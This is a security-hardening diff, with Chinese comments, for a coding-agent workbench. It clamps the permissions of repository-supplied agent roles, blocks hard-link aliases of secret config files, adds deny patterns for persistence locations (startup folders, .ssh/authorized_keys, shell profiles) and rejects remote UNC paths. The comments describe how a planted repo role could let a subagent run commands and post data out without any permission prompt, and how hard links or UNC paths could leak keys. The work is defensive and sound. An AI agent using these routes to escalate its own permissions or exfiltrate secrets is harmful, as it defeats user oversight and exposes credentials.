@@ -2084,6 +2084,53 @@ function normalizeAgentRole(raw, opts = {}) {
   if (opts.builtin) role.builtin = true;
   return role;
 }
+// 安全走查 S3(项目自带角色不得压过线程档位):`<cwd>/.ruyi/agents.json`(source 'project')与 `<cwd>/.claude/agents/*.md`(source 'claude-project')
+// 是【仓库作者】写的、用户没逐条审过的内容 —— 打开一个别人给的仓库就会被 getAgentRoleLibrary 合进角色库,而且能同名覆盖内置的 worker / reviewer。
+// 修前角色自带的 permissionMode 优先级高于线程(父回合)档位:线程是「每步都问」,项目角色一句 permissionMode:'bypass' + toolTier:'exec',
+// 子代理的 exec 工具就不再被拒也不弹窗(实测端到端:子代理 POST 外部端口零 permission_request)。现在这类角色的【有效】权限档夹到不高于父回合档位
+// (只能收紧不能放宽:项目角色自己写 plan 仍然是 plan),toolTier 夹到不高于有效档位允许的那一级;builtin / global(用户自己在设置里存的)来源逐字不变。
+// 档位强度序:plan < default(= dontAsk:都只放 read)< acceptEdits < auto < bypass;each 档位允许的最高工具级:plan/default/dontAsk→read、acceptEdits→edit、auto/bypass→exec
+// (与 07 nativeToolGate 的放行面一致:read 恒放;acceptEdits 放 edit;auto 对 exec 按高风险判据问;bypass 全放)。
+const AGENT_ROLE_UNTRUSTED_SOURCES = Object.freeze(['project', 'claude-project']);
+const AGENT_ROLE_MODE_RANK = Object.freeze({ plan: 0, default: 1, dontAsk: 1, acceptEdits: 2, auto: 3, bypass: 4 });
+const AGENT_ROLE_MODE_TIER_CEILING = Object.freeze({ plan: 'read', default: 'read', dontAsk: 'read', acceptEdits: 'edit', auto: 'exec', bypass: 'exec' });
+const AGENT_ROLE_TIER_ORDER = Object.freeze({ read: 0, edit: 1, exec: 2 });
+function agentRoleIsUntrusted(role) {
+  return !!role && typeof role === 'object' && AGENT_ROLE_UNTRUSTED_SOURCES.includes(role.source);
+}
+function agentRoleParentMode(mode) {
+  const m = mode === 'bypassPermissions' ? 'bypass' : String(mode == null ? '' : mode);
+  return Object.prototype.hasOwnProperty.call(AGENT_ROLE_MODE_RANK, m) ? m : 'default';   // 判不出父档按最严的「每步都问」算(fail-closed)
+}
+// 返回 { permissionMode, toolTier, clamped }:
+//   permissionMode —— 角色的【有效】权限档;'' = 角色没声明(inherit),调用方沿用父回合那条优先级链;
+//   toolTier       —— 夹过的工具级(入参 tier 缺省取 role.toolTier);
+//   clamped        —— null,或 { permissionMode?: {from,to}, toolTier?: {from,to} }(只列真被改动的项)。
+// 非项目来源(builtin / global / 用户)原样返回,clamped 恒为 null。parentMode 是调用时父回合【此刻】的有效档。
+function clampAgentRoleToParent(role, tier, parentMode) {
+  const declaredMode = role && role.permissionMode && role.permissionMode !== 'inherit' ? String(role.permissionMode) : '';
+  const declaredTier = (tier === 'read' || tier === 'edit' || tier === 'exec') ? tier : ((role && ['read', 'edit', 'exec'].includes(role.toolTier)) ? role.toolTier : 'read');
+  if (!agentRoleIsUntrusted(role)) return { permissionMode: declaredMode, toolTier: declaredTier, clamped: null };
+  const parent = agentRoleParentMode(parentMode);
+  const clamped = {};
+  let mode = declaredMode;
+  if (declaredMode) {
+    const rank = Object.prototype.hasOwnProperty.call(AGENT_ROLE_MODE_RANK, declaredMode) ? AGENT_ROLE_MODE_RANK[declaredMode] : AGENT_ROLE_MODE_RANK.bypass;   // 认不出的档按最宽算,于是被夹
+    if (rank > AGENT_ROLE_MODE_RANK[parent]) { mode = parent; clamped.permissionMode = { from: declaredMode, to: parent }; }
+  }
+  const effective = mode || parent;
+  const ceiling = AGENT_ROLE_MODE_TIER_CEILING[effective] || 'read';
+  let toolTier = declaredTier;
+  if (AGENT_ROLE_TIER_ORDER[declaredTier] > AGENT_ROLE_TIER_ORDER[ceiling]) { toolTier = ceiling; clamped.toolTier = { from: declaredTier, to: ceiling }; }
+  return { permissionMode: mode, toolTier, clamped: Object.keys(clamped).length ? clamped : null };
+}
+// 给角色列表 / 角色快照加【有效档位】标注(不改 permissionMode / toolTier 本身 —— 设置页编辑器把它们原样存回去,改了就把用户的声明吃掉):
+// effectivePermissionMode('inherit' = 沿用父档)、effectiveToolTier、roleClamped(null 或 clampAgentRoleToParent 的 clamped)。非项目来源不加。
+function annotateAgentRoleEffective(role, parentMode) {
+  if (!agentRoleIsUntrusted(role)) return role;
+  const c = clampAgentRoleToParent(role, role.toolTier, parentMode);
+  return { ...role, effectivePermissionMode: c.permissionMode || 'inherit', effectiveToolTier: c.toolTier, roleClamped: c.clamped };
+}
 function mergeAgentRole(base, override, source) {
   // 空颜色不覆盖底座的颜色:设置页以前存角色时不带 color,normalizeAgentRole 把缺失收成 '',落进 agentRoleOverrides 后
   // {...base, ...override} 就用 '' 把内置角色的颜色抹掉(工作流画布上的角色胶囊与左色条随之变灰)。老配置里已存的 color:'' 也靠这一条自愈。
@@ -4309,23 +4356,49 @@ async function syncClaudeCliSettings(config) {
     // 用户自己的 ~/.claude/settings.json 写成 defaultMode:auto,单独用 claude 的人被悄悄放宽、没经过任何确认。
     // 出厂值不代表用户的意思,不碰它;存量用户经 to:14 迁移钉成显式 default,照旧同步。
     const explicitMode = Array.isArray(config.configExplicitKeysV1) && config.configExplicitKeysV1.includes('permissionMode');
+    // 安全走查 S9:如意档位是 bypass(全自动)时【不】把 permissions.defaultMode 写成 bypassPermissions。如意自己的 Claude 回合每回合都带
+    // --permission-mode(05),这个全局键只会波及【脱离如意的独立 claude 会话】—— 它们被无声放宽成免问,直到用户手动改回。
+    // 其余档位的同步行为不变(照旧写)。权属 / 撤回:与下面的 model / MAX_THINKING_TOKENS 同一套 sidecar 纪律 —— sidecar 记「上次我们写进去的值」
+    // (defaultMode)与「写之前用户自己的值」(defaultModePrior,null = 当时没有这个键);切到 bypass 时,若 settings 里的值仍等于我们上次写的,
+    // 就撤回成 prior(没有 prior 就删掉这个键);不等于(用户后来自己改过)或 sidecar 没记(老版本写的,分不出是谁写的)一律原样不碰。
+    const sidecarPath = path.join(paths.data, 'claude-settings-sync.json');
+    let prevSyncedModel = null;
+    let prevSyncedThinking = null;
+    let prevSyncedDefaultMode = null;
+    let prevDefaultModePrior = null;
+    try {
+      const sc = safeJsonParse(await fsp.readFile(sidecarPath, 'utf8'), null);
+      if (sc && typeof sc.model === 'string') prevSyncedModel = sc.model;
+      if (sc && typeof sc.maxThinkingTokens === 'string') prevSyncedThinking = sc.maxThinkingTokens;
+      if (sc && typeof sc.defaultMode === 'string') { prevSyncedDefaultMode = sc.defaultMode; prevDefaultModePrior = typeof sc.defaultModePrior === 'string' ? sc.defaultModePrior : null; }
+    } catch { /* no sidecar yet */ }
+    const permsNow = (settings.permissions && typeof settings.permissions === 'object' && !Array.isArray(settings.permissions)) ? settings.permissions : null;
+    const currentDefaultMode = permsNow && typeof permsNow.defaultMode === 'string' ? permsNow.defaultMode : null;
+    const ownsDefaultMode = prevSyncedDefaultMode !== null && currentDefaultMode === prevSyncedDefaultMode;
+    let nextDefaultMode = null;        // 本次同步后 settings.permissions.defaultMode 里【由我们写的】那个值(null = 我们不拥有它)
+    let nextDefaultModePrior = null;
     if (explicitMode) {
       const cliMode = CLAUDE_PERMISSION_MODE_MAP[config.permissionMode] || config.permissionMode;
-      settings.permissions = { ...(settings.permissions || {}), defaultMode: cliMode };
+      if (cliMode === 'bypassPermissions') {
+        if (ownsDefaultMode) {
+          const rest = { ...permsNow };
+          // prior 本身是 bypassPermissions(老版本留下的,或用户原先自己设的)也不在 bypass 档下写回去 —— 写回就等于又放宽了独立 claude 会话。
+          if (prevDefaultModePrior !== null && prevDefaultModePrior !== 'bypassPermissions') rest.defaultMode = prevDefaultModePrior; else delete rest.defaultMode;
+          if (Object.keys(rest).length) settings.permissions = rest; else delete settings.permissions;
+        }
+      } else {
+        nextDefaultModePrior = ownsDefaultMode ? prevDefaultModePrior : currentDefaultMode;
+        nextDefaultMode = cliMode;
+        settings.permissions = { ...(settings.permissions || {}), defaultMode: cliMode };
+      }
+    } else if (ownsDefaultMode) {
+      nextDefaultMode = prevSyncedDefaultMode; nextDefaultModePrior = prevDefaultModePrior;   // 用户没选过档位:不碰,只把已有的权属记录带下去
     }
     // 2. Model. 第36波(v1.7): 只删【自己写过的】model —— settings.json 是用户自己的配置,工作台未设模型时
     // 无条件 delete 会把用户手写的 settings.model 一并抹掉(越权接管,与本函数 "MERGE: existing keys are
     // preserved" 的契约直接冲突)。权属用工作台侧 sidecar(dataRoot, 非用户 ~/.claude)追踪:记住上次同步写入的
     // 值,仅当 settings.model 仍等于该值时才删除(证明是我们写的);否则原样保留。sidecar 缺失(老版本首次升级)
     // 时宁可留一次陈旧值也不误删。
-    const sidecarPath = path.join(paths.data, 'claude-settings-sync.json');
-    let prevSyncedModel = null;
-    let prevSyncedThinking = null;
-    try {
-      const sc = safeJsonParse(await fsp.readFile(sidecarPath, 'utf8'), null);
-      if (sc && typeof sc.model === 'string') prevSyncedModel = sc.model;
-      if (sc && typeof sc.maxThinkingTokens === 'string') prevSyncedThinking = sc.maxThinkingTokens;
-    } catch { /* no sidecar yet */ }
     if (config.model && typeof config.model === 'string') settings.model = config.model;
     else if (prevSyncedModel && settings.model === prevSyncedModel) delete settings.model;
     // 3. Thinking budget -> env.MAX_THINKING_TOKENS。与上面的 model 同一条权属纪律:工作台没设预算时,只删【自己写过的】
@@ -4350,6 +4423,8 @@ async function syncClaudeCliSettings(config) {
     await atomicWriteJson(sidecarPath, JSON.stringify({
       model: (config.model && typeof config.model === 'string') ? config.model : null,
       maxThinkingTokens: config.thinkingBudget ? String(config.thinkingBudget) : null,   // 同上,见 "3. Thinking budget"
+      defaultMode: nextDefaultMode,                                                       // 安全走查 S9:见 "1. Permission mode"
+      defaultModePrior: nextDefaultMode !== null ? nextDefaultModePrior : null,
     })).catch(() => {});
   } catch { /* non-fatal: CLI flag --permission-mode is the primary mechanism */ }
 }
@@ -4375,7 +4450,9 @@ async function syncAgentRolesToClaude(cwd, config) {
     const skipped = [];
     for (const role of roles) {
       if (role.nativeClaude) continue;
-      const cliMode = claudePermissionMode(role.permissionMode);
+      // 安全走查 S3:项目来源的角色(仓库作者写的)不把自己声明的权限档写进用户全局 ~/.claude/agents —— 那是跨项目、用户自己的目录,
+      // 一句 permissionMode:bypassPermissions 写进去就让所有独立的 claude 会话里同名子代理都免问。该角色的档位留给起跑时按线程档夹。
+      const cliMode = agentRoleIsUntrusted(role) ? undefined : claudePermissionMode(role.permissionMode);
       var fm = ['---'];
       fm.push('description: ' + JSON.stringify(role.description || role.label));
       if (cliMode) fm.push('permissionMode: ' + cliMode);
@@ -12708,12 +12785,21 @@ async function ensureDataRootReal() {
   if (!_dataRootReal) { const r = dataRoot(); _dataRootReal = await fsp.realpath(r).catch(() => r); }
   return _dataRootReal;
 }
+// 注意:isSensitiveDataPath 必须保持【自包含】(dev-harness/audit-w23.e2e.js 把整段函数体切出来、只喂 path / dataRoot / dataRootAliases / _dataRootReal /
+// pathWithinRoot 就地实跑),所以名单字面量留在函数里,不外提成模块常量。11 的 sensitiveGlobsForRg(rg 的 !glob 排除)有另一份同内容的名单 ——
+// 两份必须一致,unit/unc-and-traversal-gates.test.js 逐个名字比对(改一份忘了另一份会红)。
 function isSensitiveDataPath(p) {
   if (!p) return false;
   const root = dataRoot();
   // 敏感子路径(相对 dataRoot):明文密钥 config.json、token runtime.json、会话/记忆/计费/审计/工作流状态/带 token 的
   // 生成配置。不含 uploads/checkpoints/webcache/skills/playbooks/agent-worktrees —— 那些是用户产物/内容,合法可读。
-  const names = ['config.json', 'runtime.json', 'sessions', 'memory', 'usage', 'logs', 'generated', 'agent-runs'];
+  // 安全走查 S7:再补 steward/(管家收件箱 / 记忆 / 决策:用户的私人上下文)、missions/(事项容器)、scheduler/(定时任务载荷)、
+  // migrations/(迁移日志:含从别的 CLI 搬过来的配置片段)、engine-transcripts.json(各引擎回合转写索引)。逐个读过码:全是数据根下
+  // 工作台自己拥有的内部数据,没有任何文件工具的合法读取场景 —— 界面与管家工具走各自的 API,不经 guardFileToolPath。
+  // 【有意不进】checkpoints/:检查点的 before 快照内容本来就是模型自己改过的文件(用户让模型「看一下改之前长什么样」是合法读),
+  // 且只在写侧受保护(WRITE_PROTECTED_DATA_DIRS);unit/write-guard-autoload.test.js 钉着「检查点内容仍可 file_read」。
+  const names = ['config.json', 'runtime.json', 'sessions', 'memory', 'usage', 'logs', 'generated', 'agent-runs',
+    'steward', 'missions', 'scheduler', 'migrations', 'engine-transcripts.json'];
   // 3.0:迁移后旧目录名是指回数据根的联接(00-boot dataRootAliases),经它的词法路径同样要命中。
   const bases = [...new Set([root, ...(_dataRootReal ? [_dataRootReal] : []), ...dataRootAliases()])];
   for (const b of bases) for (const n of names) if (pathWithinRoot(p, path.join(b, n))) return true;
@@ -12728,6 +12814,37 @@ function isSensitiveDataPath(p) {
     }
   } catch { /* 非法路径按不敏感处理，由其它围栏兜底 */ }
   return false;
+}
+// 安全走查 S7(硬链接):isSensitiveDataPath 是按路径(词法 / realpath)比的,工作区里 `ln config.json hard.json` 造出的硬链接
+// 是同一个 inode 的另一个名字,路径上与数据根毫无关系 —— file_read / file_search / archive_zip 都会把里面的明文密钥读出来。
+// 所以对两份最要命的文件(config.json 明文 provider 密钥、runtime.json WCW token)再按 dev+ino 比一道:
+//   · 只有 nlink > 1 的文件才可能是它们的别名,所以调用方先看 nlink(遍历热路径上不为此给每个文件多 stat 一次);
+//   · ino 拿不到(0n / 缺失,个别网络盘 / 非 NTFS 文件系统)时不挡 —— 宁可漏一个极罕见的别名,也不误伤正常文件;
+//   · stat 用 bigint:Windows 的文件索引是 64 位,Number 会丢精度,两个不同文件可能撞成同一个值。
+const SENSITIVE_HARDLINK_FILES = Object.freeze(['config.json', 'runtime.json']);
+async function sensitiveFileIdentities() {
+  const ids = new Set();
+  let root = '';
+  try { root = dataRoot(); } catch { return ids; }
+  for (const name of SENSITIVE_HARDLINK_FILES) {
+    try {
+      const st = await fsp.stat(path.join(root, name), { bigint: true });
+      if (st.isFile() && st.ino) ids.add(String(st.dev) + ':' + String(st.ino));
+    } catch { /* 文件不存在:没有可比对的 */ }
+  }
+  return ids;
+}
+// st 是 bigint stat。ids 缺省时现取。
+async function isSensitiveHardlinkStat(st, ids) {
+  try {
+    if (!st || !st.isFile() || !(st.nlink > 1n) || !st.ino) return false;
+    const set = ids || await sensitiveFileIdentities();
+    return set.has(String(st.dev) + ':' + String(st.ino));
+  } catch { return false; }
+}
+async function isSensitiveHardlinkAlias(filePath, ids) {
+  try { return await isSensitiveHardlinkStat(await fsp.stat(filePath, { bigint: true }), ids); }
+  catch { return false; }
 }
 // 安全审计 #1/#8(数据根里会被【自动加载 / 执行 / 信任】的状态):dataRoot 是文件工具的写根,isSensitiveDataPath
 // 只挡了「读出来会泄密」的那一批。下面这批读是无害的(或本来就要能读:检查点内容、个人工作流模板),但【写】进去
@@ -12786,6 +12903,8 @@ async function guardWorkspacePath(rawPath, session, config) {
   const targetRaw = path.resolve(rawPath);
   const target = normalizeGuardPath(targetRaw);
   const roots = fileAllowedRoots(session, config);
+  // 安全走查 W1:非本机 UNC 在任何 I/O(下面的 realpath 会去连对方主机)之前按「不在工作区」拒,除非它落在用户配置的 UNC 工作区里。
+  if (remoteUncDenial([String(rawPath), targetRaw, target], session, config)) return { ok: false, code: 'not-allowed', error: UNC_DENIED_ERROR };
   const resolved = await resolveContainmentPath(targetRaw);
   const real = normalizeGuardPath(resolved.path);
   // 安全审计 #7:链接读不出目标 / 链接层数超限 —— 不知道真实落点,不放行。
@@ -12795,6 +12914,7 @@ async function guardWorkspacePath(rawPath, session, config) {
   // (http_download 落盘自安全审计 #3 起改走 guardFileToolPath 写闸,见 11 guardDownloadDest。)
   await ensureDataRootReal();
   if (isSensitiveDataPath(target) || isSensitiveDataPath(real)) return { ok: false, code: 'not-allowed', error: '该路径属于应用内部数据,已禁止访问' };
+  if (await isSensitiveHardlinkAlias(real)) return { ok: false, code: 'not-allowed', error: '该路径属于应用内部数据,已禁止访问' };   // 安全走查 S7:硬链接别名
   const realRoots = await Promise.all(roots.map(r => realpathForContainment(r)));
   if (!pathWithinAnyRoot(real, realRoots)) return { ok: false, code: 'not-allowed', error: '路径不在允许的工作区内' };
   return { ok: true, absPath: real };
@@ -12850,7 +12970,76 @@ const AUTOEXEC_DENYLIST = [
   // core.hooksPath 就从这里绕过去(子模块里一次 git commit 即触发)。按段匹配,嵌套子模块(modules/a/modules/b/)也在内。
   /(^|[\\/])\.git[\\/]modules[\\/](?:[^\\/]+[\\/])*(?:hooks[\\/]|config(?:\.worktree)?$)/i,
   /(^|[\\/])\.git[\\/]worktrees[\\/][^\\/]+[\\/](?:hooks[\\/]|config(?:\.worktree)?$)/i,
+  // 安全走查 S4:用户级【自启动 / 登录即执行 / 全局信任配置】落点。auto / bypass 宽写 + 出厂「家目录就是工作区」时,一次 file_write
+  // 就能在这些位置留下下次登录 / 下次开终端 / 下次开 agent CLI 就替攻击者执行或改写提示词的东西。这里是【形状】判据(与路径在
+  // 不在家目录下无关,Windows 形:大小写不敏感、\ / 都认,调用方已按 abs 与 realpath 各判一遍);必须挂在用户家目录根下才算的那批
+  // (~/.bashrc、~/.gitconfig、~/.claude/CLAUDE.md、~/.codex/ 等)认的是真实家目录,见下面的 userHomePersistenceHit。
+  //   · Windows 启动文件夹:%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup 与 %ProgramData%\…\StartUp(登录即运行);
+  //   · PowerShell profile(WindowsPowerShell\ 与 PowerShell\ 下的 profile.ps1 / Microsoft.PowerShell_profile.ps1 等,每次开 PowerShell 都执行);
+  //   · .ssh\authorized_keys(2)/ config / rc / environment(后门登录、ProxyCommand 执行、登录时执行);
+  //   · XDG 自启动 .config/autostart/、用户级 systemd 单元 .config/systemd/user/、macOS LaunchAgents;
+  //   · 计划任务目录 Windows\System32\Tasks(经文件直写注册任务,绕过 schtasks 的审计)。
+  /(^|[\\/])start menu[\\/]programs[\\/]startup([\\/]|$)/i,
+  /(^|[\\/])(?:windowspowershell|powershell)[\\/](?:[^\\/]+[\\/])?(?:[a-z0-9.]+_)?profile\.ps1$/i,
+  /(^|[\\/])\.ssh[\\/](?:authorized_keys2?|config|rc|environment)$/i,
+  /(^|[\\/])\.config[\\/](?:autostart|systemd[\\/]user)([\\/]|$)/i,
+  /(^|[\\/])library[\\/]launchagents([\\/]|$)/i,
+  /(^|[\\/])windows[\\/]system32[\\/]tasks(?:_migrated)?([\\/]|$)/i,   // 只认 system32\Tasks(Ansible 的 roles/windows/tasks/ 之类工程目录不能误伤)
 ];
+// 安全走查 S4(续):必须落在【用户真实家目录】下才算的持久化落点 —— 这批文件名(.bashrc / .profile / AGENTS.md / .gitconfig …)在工作区里
+// 是普通工程文件(dotfiles 仓库、项目自己的 AGENTS.md),按「任何位置的同名路径」拦会误伤;只有挂在家目录根(或 ~/.claude/ 之类的
+// 固定子目录)下才是 shell / git / agent CLI 自己会读的那一份。家目录取 os.homedir() 与 USERPROFILE / HOME 三者(Windows 上可能不同),
+// 外加各自的 realpath(家目录是联接 / 重定向盘时 abs 与 real 拼法不同);agent CLI 的家目录取 agentCliHomes()(认 CODEX_HOME / KIMI_CODE_HOME)。
+// 返回 [{ p: 归一化(小写、/ 分隔、去尾点)路径, dir: 是否整棵子树 }]。每次现算(家目录随环境变量变,测试里会改),realpath 按输入缓存。
+const _homeRealCache = new Map();
+function homeRealpathSync(h) {
+  if (_homeRealCache.has(h)) return _homeRealCache.get(h);
+  let r = '';
+  try { r = fs.realpathSync(h); } catch { r = ''; }
+  if (_homeRealCache.size > 16) _homeRealCache.clear();
+  _homeRealCache.set(h, r);
+  return r;
+}
+const USER_HOME_PERSISTENCE_FILES = Object.freeze([
+  '.bashrc', '.bash_profile', '.bash_login', '.bash_logout', '.profile', '.zshrc', '.zshenv', '.zprofile', '.zlogin', '.zlogout',
+  '.gitconfig', '.config/git/config',
+  'AGENTS.md', 'CLAUDE.md',                     // 家目录根下的全局指令(Claude Code / Codex 会按祖先目录读到);项目里的同名文件不在此列
+  '.claude/CLAUDE.md',
+]);
+const USER_HOME_PERSISTENCE_DIRS = Object.freeze([
+  '.claude/agents', '.claude/commands', '.claude/skills',   // 子代理 / 斜杠命令 / 技能:启动即载入的提示词与权限声明
+  '.codex', '.kimi', '.kimi-code',                           // Codex / Kimi Code 的全局配置与指令(config.toml、AGENTS.md、mcp.json …)
+]);
+function userHomePersistenceTargets() {
+  const homes = new Set();
+  for (const h of [os.homedir(), process.env.USERPROFILE, process.env.HOME]) {
+    if (typeof h !== 'string' || !h.trim()) continue;
+    try { homes.add(path.resolve(h.trim())); } catch { /* skip */ }
+    const real = homeRealpathSync(h.trim());
+    if (real) homes.add(real);
+  }
+  const out = [];
+  const add = (p, dir) => { try { out.push({ p: normalizeAutoexecPath(path.resolve(p)), dir }); } catch { /* skip */ } };
+  for (const h of homes) {
+    for (const rel of USER_HOME_PERSISTENCE_FILES) add(path.join(h, ...rel.split('/')), false);
+    for (const rel of USER_HOME_PERSISTENCE_DIRS) add(path.join(h, ...rel.split('/')), true);
+  }
+  try {
+    const cli = agentCliHomes();
+    add(cli.codex, true); add(cli.kimi, true);   // CODEX_HOME / KIMI_CODE_HOME 改了位置:按真实路径拦
+    add(path.join(cli.claude, 'CLAUDE.md'), false);
+  } catch { /* 取不到:只剩上面的家目录相对表 */ }
+  return out;
+}
+function userHomePersistenceHit(absPath) {
+  if (!absPath) return false;
+  let n = '';
+  try { n = normalizeAutoexecPath(String(absPath)); } catch { return false; }
+  for (const t of userHomePersistenceTargets()) {
+    if (n === t.p || (t.dir && n.startsWith(t.p + '/'))) return true;
+  }
+  return false;
+}
 // 对路径做 Windows 语义归一:组件去尾点/尾空格 + 小写(Windows 不区分大小写,junction/短名由 realpath 化解)。
 function normalizeAutoexecPath(absPath) {
   return absPath.split(/[\\/]/).map(s => s.replace(/[. ]+$/, '')).join('/').toLowerCase();
@@ -12918,6 +13107,59 @@ function normalizeGuardPath(p) {
   }
   return s;
 }
+// 安全走查 W1(UNC 外联):`\\攻击者\share\x`(或 `//攻击者/share/x`)在 Windows 上被 realpath / readFile / writeFile 一碰就会去连那台主机的
+// SMB —— 既是绕过 web_fetch SSRF 闸的无提示外传通道(宽写档下 file_write 直接写出去),也会把本机用户的 NTLM 哈希递给对方。
+// 所以文件工具的读写闸对【非本机】UNC 路径一律拒绝,而且必须在任何 I/O(realpath 本身就会连网)【之前】判;唯一的例外是这条路径
+// 本身落在用户配置的某个工作区根之内(用户自己把网络共享配成了工作区 / 工作文件夹),纯词法判。读、写、本地模型、allowOutsideWorkspace、
+// 宽写档都一视同仁 —— 这道闸排在所有逃生舱之前。
+//   · 本机主机名(localhost / 127.0.0.1 / ::1 / 本机名)不算外联:`\\localhost\C$\…` 由 normalizeGuardPath 映回盘符后照旧过各道地板;
+//   · `\\?\C:\…`、`\\.\C:\…`(设备命名空间的本地盘)不是 UNC,不在此列;`\\?\UNC\主机\共享` 是。
+// 正斜杠起头的 `//主机/共享` 只在 Windows 上当 UNC 认(POSIX 上 `//usr/lib` 就是 /usr/lib)。
+function uncHostAndPath(p, forwardSlash) {
+  const s = String(p == null ? '' : p);
+  const fwd = forwardSlash === undefined ? process.platform === 'win32' : !!forwardSlash;
+  const isSep = ch => ch === '\\' || (fwd && ch === '/');
+  if (s.length < 3 || !isSep(s[0]) || !isSep(s[1])) return null;
+  let rest = s.slice(2);
+  const ext = /^\?[\\/]UNC[\\/]+(.*)$/i.exec(rest);
+  if (ext) rest = ext[1];
+  else if (/^[?.](?:[\\/]|$)/.test(rest) || isSep(rest[0])) return null;   // \\?\C:\ 与 \\.\device;三个及以上的分隔符不是 UNC
+  const segs = [];
+  for (const seg of rest.split(/[\\/]+/)) {
+    if (seg === '' || seg === '.') continue;
+    if (seg === '..') { if (segs.length > 2) segs.pop(); continue; }   // 不爬出 主机\共享 两段
+    segs.push(seg.replace(/[. ]+$/, ''));
+  }
+  if (!segs.length || !segs[0]) return null;
+  const host = segs[0].toLowerCase().replace(/^\[|\]$/g, '');
+  return { host, norm: ('\\\\' + segs.join('\\')).toLowerCase() };
+}
+function uncIsLocalHost(host) {
+  const h = String(host || '').toLowerCase();
+  let me = '';
+  try { me = (os.hostname ? os.hostname() : '').toLowerCase(); } catch { me = ''; }
+  return h === 'localhost' || h === '127.0.0.1' || h === '::1' || (me !== '' && h === me);
+}
+// 返回 '' = 不拦;否则是拒绝原因。candidates:要判的几种拼法(原串 / resolve 后 / realpath 后),任一是越界 UNC 即拒。
+function remoteUncDenial(candidates, session, config, forwardSlash) {
+  const hits = [];
+  for (const c of candidates) {
+    const u = uncHostAndPath(c, forwardSlash);
+    if (u && !uncIsLocalHost(u.host)) hits.push(u);
+  }
+  if (!hits.length) return '';
+  const roots = [];
+  const push = r => { const u = typeof r === 'string' ? uncHostAndPath(r.trim(), forwardSlash) : null; if (u && !uncIsLocalHost(u.host)) roots.push(u.norm); };
+  if (session && typeof session.cwd === 'string') push(session.cwd);
+  if (config && typeof config.defaultWorkspace === 'string') push(config.defaultWorkspace);
+  for (const w of (config && Array.isArray(config.recentWorkspaces) ? config.recentWorkspaces : [])) push(w);
+  for (const w of (config && Array.isArray(config.workspaces) ? config.workspaces : [])) { if (w && typeof w === 'object') push(w.path); }
+  for (const u of hits) {
+    if (!roots.some(r => u.norm === r || u.norm.startsWith(r + '\\'))) return u.host;
+  }
+  return '';
+}
+const UNC_DENIED_ERROR = '不允许经文件工具访问网络共享(\\\\主机\\共享 形式的路径):这会把文件内容或本机登录凭据交给对方主机。要使用某个网络共享,请先在「设置 › 基础 › 工作区权限」把它添加为工作区';
 // ctx may be null (the one-shot MCP child passes none): then config is read from disk and session is absent,
 // so dataRoot still bounds it. Returns { ok:true, absPath } or { ok:false, code:'not-allowed', error }.
 // 走查 U7:越界报错说人话、说清去哪儿改,不印配置键名(它也会原样出现在对话卡上)。
@@ -12931,6 +13173,11 @@ async function guardFileToolPath(rawPath, ctx, opts) {
   let config = ctx && ctx.config ? ctx.config : null;
   if (!config) { try { config = await readConfig(); } catch { config = {}; } }
   const session = ctx && ctx.session ? ctx.session : null;
+  // 安全走查 W1:非本机 UNC 在任何 I/O 之前拒(realpath 自己就会去连对方主机的 SMB),排在所有逃生舱与宽写之前。
+  if (remoteUncDenial([String(rawPath || ''), absRaw, abs], session, config)) {
+    logEvent({ kind: 'workspace_boundary', tool, op: write ? 'write' : 'read', decision: 'deny-unc', pathLen: abs.length });
+    return { ok: false, code: 'not-allowed', error: UNC_DENIED_ERROR };
+  }
   const resolved = await resolveContainmentPath(absRaw);
   const real = normalizeGuardPath(resolved.path);
   // 安全审计 #7:悬空链接已在 resolveContainmentPath 里解到真实落点(下面的包含判定与三层地板都按它判);
@@ -12938,6 +13185,24 @@ async function guardFileToolPath(rawPath, ctx, opts) {
   if (resolved.unresolvable) {
     logEvent({ kind: 'workspace_boundary', tool, op: write ? 'write' : 'read', decision: 'deny-unresolvable-link', pathLen: abs.length });
     return { ok: false, code: 'not-allowed', error: '该路径经过无法解析的符号链接/联接,已拒绝' };
+  }
+  // 链接解出来落在非本机 UNC(本地路径里的符号链接指向 \\攻击者\share):同样按越界 UNC 拒。
+  // 映射网络盘(Z:\ 本身就解到 \\服务器\共享)是用户自己挂的,realpath 把它还原成 UNC 不是「路径里的链接把请求带出去」—— 不拦;
+  // 判据:盘符根自己的 realpath 就是非本机 UNC。只在 real 真的是非本机 UNC 时才多这一次解析。
+  {
+    const realUnc = uncHostAndPath(real);
+    if (realUnc && !uncIsLocalHost(realUnc.host)) {
+      let mappedDrive = false;
+      const dm = /^([A-Za-z]:)[\\/]/.exec(abs);
+      if (dm) {
+        const du = uncHostAndPath(await realpathForContainment(dm[1] + '\\'));
+        mappedDrive = !!(du && !uncIsLocalHost(du.host));
+      }
+      if (!mappedDrive && remoteUncDenial([real], session, config)) {
+        logEvent({ kind: 'workspace_boundary', tool, op: write ? 'write' : 'read', decision: 'deny-unc', pathLen: abs.length });
+        return { ok: false, code: 'not-allowed', error: UNC_DENIED_ERROR };
+      }
+    }
   }
   // 审计 P1: 敏感控制面文件二次拒绝(见 isSensitiveDataPath)。放在 allowOutsideWorkspace 逃生舱【之前】——即便用户
   // 开了越界豁免,应用自身的 config/runtime/sessions/memory 等也绝不可经文件工具读写(密钥/会话/token 外传面)。
@@ -12947,6 +13212,15 @@ async function guardFileToolPath(rawPath, ctx, opts) {
     logEvent({ kind: 'workspace_boundary', tool, op: write ? 'write' : 'read', decision: 'deny-sensitive', pathLen: abs.length });
     return { ok: false, code: 'not-allowed', error: '该路径属于应用内部数据(配置/会话/记忆/日志等),已禁止文件工具访问' };
   }
+  // 安全走查 S7:config.json / runtime.json 的【硬链接别名】(同一个 inode 的另一个名字,路径上看不出来)按 dev+ino 比一道。
+  // 目标存在才比;不存在(要新建的文件)/ 目录 / nlink=1 的普通文件一次 stat 就过。读写都拒(写进别名就是改写 config.json)。
+  try {
+    const stTarget = await fsp.stat(real, { bigint: true }).catch(() => null);
+    if (stTarget && await isSensitiveHardlinkStat(stTarget)) {
+      logEvent({ kind: 'workspace_boundary', tool, op: write ? 'write' : 'read', decision: 'deny-sensitive-hardlink', pathLen: abs.length });
+      return { ok: false, code: 'not-allowed', error: '该路径属于应用内部数据(配置/会话/记忆/日志等),已禁止文件工具访问' };
+    }
+  } catch { /* stat 失败:交给后面的闸 */ }
   // 第31波B(L1): autoexec 检查下沉到 guardFileToolPath —— 全模式覆盖(含 bypass/plan/default),不再依赖授权书层。
   // 仅 write 时检查(读 .git/hooks 不会触发自动执行);对 abs 与 real 双路径归一后匹配 denylist,命中即拒。
   if (write) {
